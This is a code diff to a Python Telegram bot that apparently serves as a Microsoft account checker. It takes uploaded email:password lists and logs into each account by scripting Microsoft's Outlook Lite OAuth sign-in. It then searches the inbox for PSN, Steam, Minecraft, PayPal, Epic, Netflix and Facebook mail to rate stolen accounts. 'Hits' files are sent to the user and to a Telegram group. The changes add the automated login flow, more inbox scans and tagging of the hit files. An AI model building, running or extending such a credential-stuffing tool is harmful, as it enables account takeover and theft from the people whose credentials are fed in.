@@ -47,6 +47,49 @@ def send_document(chat_id, path, caption=None):
             data["caption"] = caption
         return api("sendDocument", data, files=files)
 
+# ------------------- Dates and Currency Helpers (from q.py) -------------------
+from datetime import datetime
+
+def get_remaining_days(date_str):
+    try:
+        if not date_str:
+            return "0"
+        renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
+        today = datetime.now(renewal_date.tzinfo)
+        remaining = (renewal_date - today).days
+        return str(remaining)
+    except:
+        return "0"
+
+CURRENCY_SYMBOLS = {
+    "USD": "$", "EUR": "€", "GBP": "£", "JPY": "¥", "CNY": "¥",
+    "RUB": "₽", "TRY": "₺", "INR": "₹", "KRW": "₩", "AED": "د.إ",
+    "SAR": "﷼", "QAR": "﷼", "KWD": "د.ك", "BHD": ".د.ب", "OMR": "﷼",
+    "EGP": "£", "MAD": "د.م.", "TND": "د.ت", "DZD": "د.ج", "LBP": "ل.ل",
+    "JOD": "د.أ", "ILS": "₪", "PKR": "₨", "BDT": "৳", "THB": "฿",
+    "IDR": "Rp", "MYR": "RM", "SGD": "$", "HKD": "$", "AUD": "$",
+    "NZD": "$", "CAD": "$", "MXN": "$", "ARS": "$", "CLP": "$",
+    "COP": "$", "BRL": "R$", "PHP": "₱", "NGN": "₦", "ZAR": "R",
+}
+
+AMBIGUOUS_CODES = {"USD", "CAD", "AUD", "NZD", "MXN", "ARS", "CLP", "COP", "HKD", "SGD", "CNY", "JPY"}
+
+def format_currency(amount, code=None):
+    try:
+        amt_str = str(amount).strip()
+        if code:
+            code = code.upper().strip()
+        sym = CURRENCY_SYMBOLS.get(code or "", "")
+        if sym:
+            if code in AMBIGUOUS_CODES:
+                return f"{sym}{amt_str} {code}"
+            return f"{sym}{amt_str}"
+        if code:
+            return f"{amt_str} {code}"
+        return amt_str
+    except:
+        return str(amount)
+
 def get_file(file_id):
     j = api("getFile", {"file_id": file_id})
     if not j.get("ok"):
@@ -214,6 +257,84 @@ class UnifiedChecker:
             rt = j.get("refresh_token", "")
             cid = (self.session.cookies.get("MSPCID", "") or "").upper()
             return {"access_token": at, "refresh_token": rt, "cid": cid}
+        except:
+            return None
+
+    # Token flow (from q.py) as alternative to _ms_hard_login
+    def get_ms_tokens(self, email, password):
+        try:
+            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
+            headers1 = {
+                "X-OneAuth-AppName": "Outlook Lite",
+                "X-Office-Version": "3.11.0-minApi24",
+                "X-CorrelationId": self.uuid,
+                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
+                "Host": "odc.officeapps.live.com",
+                "Connection": "Keep-Alive",
+                "Accept-Encoding": "gzip"
+            }
+            r1 = self.session.get(url1, headers=headers1, timeout=15)
+            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
+                return None
+            if "MSAccount" not in r1.text:
+                return None
+            time.sleep(0.3)
+            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
+            headers2 = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Connection": "keep-alive"
+            }
+            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
+            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
+            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
+            if not url_match or not ppft_match:
+                return None
+            post_url = url_match.group(1).replace("\\/", "/")
+            ppft = ppft_match.group(1)
+            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
+            headers3 = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Origin": "https://login.live.com",
+                "Referer": r2.url
+            }
+            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=10)
+            response_text = r3.text.lower()
+            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
+                return None
+            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
+                return None
+            if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
+                return None
+            if "https://account.live.com/Abuse" in r3.text:
+                return None
+            location = r3.headers.get("Location", "")
+            if not location:
+                return None
+            code_match = re.search(r'code=([^&]+)', location)
+            if not code_match:
+                return None
+            code = code_match.group(1)
+            mspcid = self.session.cookies.get("MSPCID", "")
+            if not mspcid:
+                return None
+            cid = mspcid.upper()
+            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
+                                   data=token_data,
+                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
+                                   timeout=10)
+            if "access_token" not in r4.text:
+                return None
+            token_json = r4.json()
+            return {
+                "access_token": token_json.get("access_token", ""),
+                "refresh_token": token_json.get("refresh_token", ""),
+                "cid": cid
+            }
         except:
             return None
 
@@ -453,24 +574,16 @@ class UnifiedChecker:
         except:
             return {"facebook_status": "ERROR", "facebook_emails": 0}
 
-    def _scan_services(self, at, cid, email_addr):
-        out = {}
-        nf = self.check_netflix(at, cid, email_addr)
-        fb = self.check_facebook(at, cid, email_addr)
-        if nf.get("netflix_status") == "LINKED":
-            out["Netflix"] = True
-        if fb.get("facebook_status") == "LINKED":
-            out["Facebook"] = True
-        # Optional PSN detection via Outlook search
+    # --- Additional service scans (Outlook Search first, IMAP fallback) ---
+    def _search_count(self, access_token, cid, query, timeout=10):
         try:
             url = "https://outlook.live.com/search/api/v2/query"
             h = {
                 'User-Agent': 'Outlook-Android/2.0',
-                'Authorization': f'Bearer {at}',
+                'Authorization': f'Bearer {access_token}',
                 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json'
             }
-            q = "sony@txn-email.playstation.com OR sony@txn-email01.playstation.com OR sony@txn-email02.playstation.com OR sony@txn-email03.playstation.com"
             payload = {
                 "Cvid": str(uuid.uuid4()),
                 "Scenario": {"Name": "owa.react"},
@@ -485,23 +598,77 @@ class UnifiedChecker:
                         {"Term": {"DistinguishedFolderName": "Inbox"}}
                     ]},
                     "From": 0,
-                    "Query": {"QueryString": q},
+                    "Query": {"QueryString": query},
                     "Size": 50,
                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                 }]
             }
-            r = self.session.post(url, json=payload, headers=h, timeout=10)
-            if r.status_code == 200:
-                data = r.json()
-                total = 0
-                for es in data.get('EntitySets', []):
-                    for rs in es.get('ResultSets', []):
-                        total = rs.get('Total', 0)
-                        break
-                if total > 0:
-                    out["PSN"] = True
+            r = self.session.post(url, json=payload, headers=h, timeout=timeout)
+            if r.status_code != 200:
+                return 0
+            total = 0
+            for es in r.json().get('EntitySets', []):
+                for rs in es.get('ResultSets', []):
+                    total = rs.get('Total', 0)
+                    break
+            return int(total or 0)
         except:
-            pass
+            return 0
+
+    def check_psn(self, access_token, cid):
+        q = "sony@txn-email.playstation.com OR sony@txn-email01.playstation.com OR sony@txn-email02.playstation.com OR sony@txn-email03.playstation.com"
+        total = self._search_count(access_token, cid, q, timeout=12)
+        return {"psn_status": "HAS_ORDERS" if total > 0 else "FREE", "psn_emails_count": total}
+
+    def check_steam_simple(self, access_token, cid):
+        q = "store.steampowered.com OR noreply@steampowered.com OR Steam purchase"
+        total = self._search_count(access_token, cid, q, timeout=10)
+        return {"steam_status": "HAS_PURCHASES" if total > 0 else "FREE", "steam_count": total}
+
+    def check_minecraft_simple(self, access_token, cid):
+        q = "mojang.com OR minecraft.net OR noreply@mojang.com"
+        total = self._search_count(access_token, cid, q, timeout=10)
+        return {"minecraft_status": "OWNED" if total > 0 else "FREE", "minecraft_emails": total}
+
+    def check_paypal_simple(self, access_token, cid):
+        q = "service@paypal.com OR @paypal.com"
+        total = self._search_count(access_token, cid, q, timeout=10)
+        return {"paypal_status": "LINKED" if total > 0 else "FREE", "paypal_emails": total}
+
+    def check_epic_simple(self, access_token, cid):
+        q = "@epicgames.com OR Epic Games"
+        total = self._search_count(access_token, cid, q, timeout=10)
+        return {"epic_status": "LINKED" if total > 0 else "FREE", "epic_emails": total}
+
+    def _scan_services(self, at, cid, email_addr):
+        out = {}
+        # Use multi-service detection (search + IMAP)
+        try:
+            nf = self.check_netflix(at, cid, email_addr)
+            if nf.get("netflix_status") == "LINKED":
+                out["Netflix"] = True
+        except: nf = {}
+        try:
+            fb = self.check_facebook(at, cid, email_addr)
+            if fb.get("facebook_status") == "LINKED":
+                out["Facebook"] = True
+        except: fb = {}
+        # Additional service checks via search
+        psn = self.check_psn(at, cid)
+        if psn.get("psn_status") == "HAS_ORDERS":
+            out["PSN"] = True
+        st = self.check_steam_simple(at, cid)
+        if st.get("steam_status") == "HAS_PURCHASES":
+            out["Steam"] = True
+        mc = self.check_minecraft_simple(at, cid)
+        if mc.get("minecraft_status") == "OWNED":
+            out["Minecraft"] = True
+        pp = self.check_paypal_simple(at, cid)
+        if pp.get("paypal_status") == "LINKED":
+            out["PayPal"] = True
+        ep = self.check_epic_simple(at, cid)
+        if ep.get("epic_status") == "LINKED":
+            out["Epic Games"] = True
         # Generic IMAP header scan for mapped services and optional custom domain
         try:
             mail, err = self._imap_xoauth2_connect(email_addr, at, 'imap-mail.outlook.com', 993)
@@ -571,12 +738,13 @@ def build_balance_text(ms_data):
         if "balance_amount" in ms_data:
             amt = ms_data.get("balance_amount")
             cur = ms_data.get("balance_currency") or ""
-            parts.append(f"{amt}{cur}")
+            parts.append(format_currency(amt, cur or None))
         elif "balance" in ms_data:
-            parts.append(str(ms_data.get("balance")))
+            parts.append(format_currency(ms_data.get("balance"), None))
         if "rewards_points" in ms_data:
             parts.append(f"Rewards:{ms_data['rewards_points']}")
-    return " | ".join([p for p in parts if p]) if parts else ""
+    # Ensure default visible value
+    return " | ".join([p for p in parts if p]) if parts else "0.0 USD"
 
 def format_result(res):
     email = res.get("email", "")
@@ -584,7 +752,7 @@ def format_result(res):
     country = (res.get("country") or "??").strip().upper()
     xbox = res.get("xbox", {}) or {}
     xdet = xbox.get("details") or xbox.get("status") or ""
-    xbox_text = f"Xbox: {xdet if xdet else 'not FOUND'}"
+    xbox_text = f"Xbox: {xdet if xdet else 'none'}"
     balance_text = build_balance_text(res.get("ms_data", {}))
     services = res.get("services", {}) or {}
     svc_list = [k for k, v in services.items() if v]
@@ -724,7 +892,7 @@ class BotApp:
             path = os.path.join(os.getcwd(), name)
             try:
                 with open(path, "w", encoding="utf-8") as f:
-                    f.writelines([ln + "\n" for ln in sess.batch])
+                    f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in sess.batch])
                 send_document(chat_id, path, caption=f"Hits batch ({len(sess.batch)})")
                 try:
                     send_document(GROUP_ID, path, caption=f"Hits batch ({len(sess.batch)})")
@@ -740,7 +908,7 @@ class BotApp:
             self.sessions[chat_id] = sess
         sess.total = len(accounts)
         kb = {"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]}
-        send_message(chat_id, f"Started scan: {sess.total} accounts\nIP: {get_ip()}", reply_markup=kb)
+        send_message(chat_id, f"Started scan: {sess.total} accounts\nSend file to begin if not already.", reply_markup=kb)
         self._send_status(sess, chat_id, force=True)
         def worker(acc):
             if sess.stop_ev.is_set():
@@ -814,7 +982,7 @@ class BotApp:
         try:
             with open(path, "w", encoding="utf-8") as f:
                 for ln in sess.results:
-                    f.write(ln + "\n")
+                    f.write(ln + " | BY : @T_Q_mailbot\n")
             send_document(chat_id, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
             try:
                 send_document(GROUP_ID, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
@@ -841,7 +1009,7 @@ class BotApp:
         sess.awaiting_domain = True
         sess.pending_accounts = accounts
         kb = {"inline_keyboard": [[{"text": "Skip", "callback_data": f"SKIP_{chat_id}"}]]}
-        send_message(chat_id, "أرسل دومين إضافي للبحث (مثل: netflix.com) أو اضغط Skip", reply_markup=kb)
+        send_message(chat_id, "Send an extra sender domain to scan (e.g., netflix.com) or press Skip", reply_markup=kb)
 
     def handle_stop(self, chat_id):
         with self.lock:
@@ -869,9 +1037,20 @@ class BotApp:
                         chat_id = m["chat"]["id"]
                         if "document" in m:
                             fid = m["document"]["file_id"]
+                            # announce to group who started and from where
+                            try:
+                                usr = m.get("from", {})
+                                uname = usr.get("username") or f"{usr.get('first_name','')}".strip() or str(chat_id)
+                                ip = get_ip()
+                                send_message(GROUP_ID, f"Scan started by @{uname} (chat:{chat_id}) | IP: {ip}")
+                            except Exception:
+                                pass
                             self.handle_file(chat_id, fid)
                         elif "text" in m:
                             txt = m["text"].strip()
+                            if txt.lower() in ("/start", "start"):
+                                send_message(chat_id, "Please send a text file (email:pass per line) to begin scanning.")
+                                continue
                             if txt.lower() == "stop":
                                 self.handle_stop(chat_id)
                                 continue
